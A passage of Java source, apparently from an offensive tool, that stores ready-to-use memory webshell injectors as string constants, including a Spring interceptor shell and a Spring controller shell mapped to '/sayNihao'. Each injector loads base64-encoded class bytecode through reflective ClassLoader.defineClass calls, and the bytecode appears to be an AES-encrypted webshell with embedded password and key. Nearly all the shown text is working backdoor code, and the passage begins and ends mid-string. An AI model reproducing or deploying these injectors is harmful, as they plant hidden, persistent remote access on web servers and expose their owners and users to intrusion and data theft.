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\");\n" +
            "            Method var2 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "            var2.setAccessible(true);\n" +
            "            Class clazz = (Class)var2.invoke(var0.getClass().getClassLoader(), var1, 0, var1.length);\n" +
            "            clazz.newInstance();\n" +
            "        } catch (Exception var5) {\n" +
            "        }\n" +
            "\n" +
            "        try {\n" +
            "            Field var6 = var0.getClass().getDeclaredField(\"eventsManager\");\n" +
            "            var6.setAccessible(true);\n" +
            "            Object var7 = var6.get(var0);\n" +
            "            Method var3 = var7.getClass().getDeclaredMethod(\"registerEventListener\", String.class);\n" +
            "            var3.setAccessible(true);\n" +
            "            var3.invoke(var7, shellClassName);\n" +
            "        } catch (Exception var4) {\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while(var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "}\n";

    public static final String SpringInterceptorMemShell=
            "import org.springframework.web.context.WebApplicationContext;\n" +
            "import org.springframework.web.context.request.RequestContextHolder;\n" +
            "\n" +
            "import java.lang.reflect.Method;\n" +
            "\n" +
            "public class SpringInterceptorMemShell {\n" +
            "\n" +
            "    private static Object MEMSHELL_OBJECT;\n" +
            "    private static final String interceptor_name = \"memshell.SpringInterceptorShell\";\n" +
            "\n" +
            "    public SpringInterceptorMemShell() {\n" +
            "        InjectMemClass();\n" +
            "        InjectMem();\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    public static synchronized void InjectMem() {\n" +
            "        try {\n" +
            "            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
            "            // 从context中获取AbstractHandlerMapping的实例对象\n" +
            "            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\");\n" +
            "            // 反射获取adaptedInterceptors属性\n" +
            "            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
            "            field.setAccessible(true);\n" +
            "            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);\n" +
            "            // 避免重复添加\n" +
            "            for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {\n" +
            "                if (adaptedInterceptors.get(i).getClass().getName().equals(interceptor_name)) {\n" +
            "                    System.out.println(\"已经添加过TestInterceptor实例了\");\n" +
            "                }\n" +
            "            }\n" +
            "            adaptedInterceptors.add(MEMSHELL_OBJECT);  //  添加全局interceptor\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    public static synchronized void InjectMemClass() {\n" +
            "        try {\n" +
            "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(interceptor_name).newInstance();\n" +
            "        } catch (Exception var5) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 = base64Decode(\"yv66vgAAADMBJAoAUwCQCACRCQBSAJIIAJMJAFIAlAgAlQkAUgCWBwCXCgAIAJAKAAgAmAoACACZCgBSAJoJAFIAmwgAnAkAUgCdCACeCgCfAKAHAKEKAC0AogoAEgCjCgCfAKQKAJ8ApQcApggApwoAqACpCgAtAKoKAKgAqwcArAoAqACtCgAcAK4KABwArwoALQCwCACxCgAqALIIALMHALQKACoAtQcAtgoAtwC4CgAsALkIALoHALsHAGgHALwHAL0IAL4KACoAvwgAwAgAwQgAwggAwwgAxAgAxQsAxgDHCADICgAtAMkLAMYAygsAxgDLCgBSAMwKAFIAzQgAzgsAzwDQBwDRCgAqANIKAD8A0woAPwDUCwDPANUIANYLAMYA1QcA1woARgCQCgAsANgLANkA2goALQDbCgDcAN0KACwAmQoARgDeCgBSAN8KAC0A4AgA4QgA4gcA4wcA5AEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACFMbWVtc2hlbGwvU3ByaW5nSW50ZXJjZXB0b3JTaGVsbDsBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAltCAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDjBwDlBwCmAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcAvQEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgcA5gEAClNvdXJjZUZpbGUBABtTcHJpbmdJbnRlcmNlcHRvclNoZWxsLmphdmEMAFoAWwEAEDNjNmUwYjhhOWMxNTIyNGEMAFQAVQEABHBBUzMMAFYAVQEAEC9mYXZpY29uZGVtby5pY28MAFcAVQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDADnAOgMAOkA6gwAWABvDABYAFUBAAVVVEYtOAwAWQBVAQADQUVTBwDlDADrAOwBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDADtAO4MAFoA7wwA8ADxDADyAPMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwD0DADrAPUMAPYA9wwA+AD5AQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAPoA7gwAWgD7DADpAPwMAP0A6gEAEGphdmEudXRpbC5CYXNlNjQMAP4A/wEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMAQABAQEAE1tMamF2YS9sYW5nL09iamVjdDsHAQIMAQMBBAwBBQEGAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMAQcBCAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAQWC1SZXF1ZXN0ZWQtV2l0aAcBCQwBCgBvAQAOWE1MSFRUUFJlcXVlc3QMAQsBDAwBDQEODAEPAG8MAH0AfgwAYQBiAQAQbWVtc2hlbGwucGF5bG9hZAcA5gwBEAERAQAKbWVtc2hlbGwvWAwBEgETDABaARQMARUBFgwBFwEYAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAEZARoHARsMARwBHQwBHgEfBwEgDAEhASIMASMA7gwAcwB0DAEeAPwBAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MBAB9tZW1zaGVsbC9TcHJpbmdJbnRlcmNlcHRvclNoZWxsAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0hhbmRsZXJJbnRlcmNlcHRvckFkYXB0ZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAlnZXRIZWFkZXIBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQALdG9CeXRlQXJyYXkAIQBSAFMAAAAFAAAAVABVAAAAAQBWAFUAAAABAFcAVQAAAAAAWABVAAAAAQBZAFUAAAAGAAEAWgBbAAEAXAAAAH4AAwABAAAAPCq3AAEqEgK1AAMqEgS1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\");\n" +
            "                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "                MEMSHELL_OBJECT = var3.newInstance();\n" +
            "            } catch (Exception var4) {\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    static {\n" +
            "        new SpringInterceptorMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String SpringControllerMemShell =
            "import org.springframework.web.context.WebApplicationContext;\n" +
            "import org.springframework.web.context.request.RequestContextHolder;\n" +
            "import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;\n" +
            "import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;\n" +
            "import org.springframework.web.servlet.mvc.method.RequestMappingInfo;\n" +
            "import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;\n" +
            "\n" +
            "import java.lang.reflect.Method;\n" +
            "\n" +
            "public class SpringControllerMemShell {\n" +
            "    private static Object MEMSHELL_OBJECT;\n" +
            "    private static final String controller_name = \"memshell.SpringControllerShell\";\n" +
            "    private static final String method_name = \"a\";\n" +
            "\n" +
            "    public SpringControllerMemShell() {\n" +
            "        InjectMemClass();\n" +
            "        InjectMem();\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized void InjectMem() {\n" +
            "        try {\n" +
            "            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
            "            // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean\n" +
            "            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);\n" +
            "            // 2. 通过反射获得自定义 controller 中test的 Method 对象\n" +
            "            Method method2 = MEMSHELL_OBJECT.getClass().getMethod(method_name);\n" +
            "            // 3. 定义访问 controller 的 URL 地址\n" +
            "            PatternsRequestCondition url = new PatternsRequestCondition(\"/sayNihao\");\n" +
            "            // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）\n" +
            "            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();\n" +
            "            // 5. 在内存中动态注册 controller\n" +
            "            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);\n" +
            "\n" +
            "            mappingHandlerMapping.registerMapping(info, MEMSHELL_OBJECT, method2);\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void InjectMemClass() {\n" +
            "        try {\n" +
            "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(controller_name).newInstance();\n" +
            "        } catch (Exception var5) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 = base64Decode(\"yv66vgAAADMBQAoAWgCdCACeCQBFAJ8IAKAJAEUAoQgAogkARQCjBwCkCgAIAJ0KAAgApQoACACmCgBFAKcJAEUAqAgAqQkARQCqCgBaAKsKAFoArAgArQoArgCvBwCwCgAvALEKABQAsgoArgCzCgCuALQHALUIALYKALcAuAoALwC5CgC3ALoHALsKALcAvAoAHgC9CgAeAL4KAC8AvwgAwAoALADBCADCBwDDCgAsAMQHAMUKAMYAxwoALgDICADJBwDKBwBuBwDLBwDMCADNCgAsAM4IAM8IANAIANEIANIIANMKANQA1QcA1goAOADXCgA4ANgIANkLANoA2wgA3AoALwDdCwDaAN4LANoA3woARQDgCgBFAOEIAOILAOMA5AcA5QoALADmCgBFAKsKAEUA5wsA4wDoCADpCwDaAOgHAOoKAEwAnQoALgDrCwDsAO0KAC8A7goA7wDwCgAuAKYKAEwA8QoARQDyCgAvAPMKAO8A9AoA7wD1CAD2CAD3BwD4AQACeGMBABJMamF2YS9sYW5nL1N0cmluZzsBAANQd2QBAARwYXRoAQADbWQ1AQACY3MBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExtZW1zaGVsbC9TcHJpbmdDb250cm9sbGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDlBwD5BwC1AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcAzAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEAAWEBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7BwD6BwD7BwD8AQAKU291cmNlRmlsZQEAGlNwcmluZ0NvbnRyb2xsZXJTaGVsbC5qYXZhDABhAGIBABAzYzZlMGI4YTljMTUyMjRhDABbAFwBAARwQVMzDABdAFwBABAvZmF2aWNvbmRlbW8uaWNvDABeAFwBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwA/QD+DAD/AQAMAF8AfAwAXwBcAQAFVVRGLTgMAGAAXAwAYQBoDAEBAQIBAANBRVMHAPkMAQMBBAEAH2phdmF4L2NyeXB0by9zcGVjL1N